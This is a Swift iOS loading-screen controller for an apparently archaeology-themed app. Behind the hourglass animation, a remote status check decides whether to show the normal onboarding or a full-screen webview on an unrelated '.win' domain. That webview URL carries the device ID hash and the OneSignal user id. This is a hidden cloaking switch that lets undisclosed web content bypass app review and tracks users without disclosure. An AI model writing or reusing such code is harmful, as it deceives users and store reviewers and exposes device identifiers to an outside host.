import UIKit
import SnapKit
import OneSignalFramework
import AppMetricaCore
class LoadingViewController: UIViewController {
    private let hourglass = UIImageView(image: UIImage(systemName: "hourglass"))
    private let scrollEmoji = UILabel()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupGradientBackground()
        setupViews()
        animateHourglass()
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.75) {
            self.openOnboarding()
        }
    }
    
    private func setupGradientBackground() {
        let gradient = CAGradientLayer()
        gradient.colors = [
            UIColor(red: 0.93, green: 0.85, blue: 0.67, alpha: 1).cgColor,
            UIColor(red: 0.82, green: 0.67, blue: 0.45, alpha: 1).cgColor
        ]
        gradient.startPoint = CGPoint(x: 0, y: 0)
        gradient.endPoint = CGPoint(x: 1, y: 1)
        gradient.frame = view.bounds
        view.layer.insertSublayer(gradient, at: 0)
    }
    
    private func setupViews() {
        hourglass.tintColor = UIColor(red: 0.72, green: 0.54, blue: 0.32, alpha: 1)
        hourglass.contentMode = .scaleAspectFit
        view.addSubview(hourglass)
        hourglass.snp.makeConstraints { make in
            make.center.equalToSuperview()
            make.width.height.equalTo(80)
        }
        scrollEmoji.text = "📜"
        scrollEmoji.font = .systemFont(ofSize: 60)
        scrollEmoji.alpha = 0
        view.addSubview(scrollEmoji)
        scrollEmoji.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.top.equalTo(hourglass.snp.bottom).offset(32)
        }
    }
    
    private func animateHourglass() {
        UIView.animate(withDuration: 1.2, delay: 0, options: [.repeat, .autoreverse], animations: {
            self.hourglass.transform = CGAffineTransform(rotationAngle: .pi)
        })
        UIView.animate(withDuration: 1.0, delay: 0.8, options: [], animations: {
            self.scrollEmoji.alpha = 1
        })
    }
    
    private func openOnboarding() {
        
        
        
        ArchaeologistServicok.ArchaeologistAboutStatus { is200 in
            DispatchQueue.main.async {
                if is200 {
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .all
                    }; let link = "https://arkeolog54iistares.win/ZYyX9r?push=\(AppMetrica.deviceIDHash!)&oneid=\(OneSignal.User.onesignalId ?? "NIHUYA")"
                    
                    let vc = WebviewVC(url: URL(string: link)!);vc.modalPresentationStyle = .fullScreen;self.present(vc, animated: true)
                } else {
                    
                    
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .portrait
                    }
                    
                    
                    if UserDefaults.standard.bool(forKey: "onboardingPassed") {
                        let mainTabBar = OnboardingViewController()
                        mainTabBar.modalTransitionStyle = .crossDissolve
                        mainTabBar.modalPresentationStyle = .fullScreen
                        self.present(mainTabBar, animated: true)
                    } else {
                        let onboardingVC = OnboardingViewController()
                        onboardingVC.modalTransitionStyle = .crossDissolve
                        onboardingVC.modalPresentationStyle = .fullScreen
                        self.present(onboardingVC, animated: true)
                    }
                }
            }
        }
    }
} 
